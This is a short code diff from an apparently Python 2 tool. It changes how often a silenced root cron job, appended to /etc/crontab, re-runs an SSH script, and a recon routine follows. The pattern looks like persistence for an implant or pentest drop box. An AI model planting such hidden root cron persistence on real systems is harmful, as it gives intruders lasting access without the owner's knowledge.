@@ -289,7 +289,7 @@ def main():
             if checkSSHLOC not in open('/etc/crontab').read():
                 with open('/etc/crontab', "a") as file:
                     print G+"[+] Added SSH to try every minute in /etc/crontab"+W
-                    file.write("*/1 * * * * root bash %s > /dev/null 2>&1 \n" %(checkSSHLOC))
+                    file.write("*/2 * * * * root bash %s > /dev/null 2>&1 \n" %(checkSSHLOC))
     
     if recon:
         startRecon()
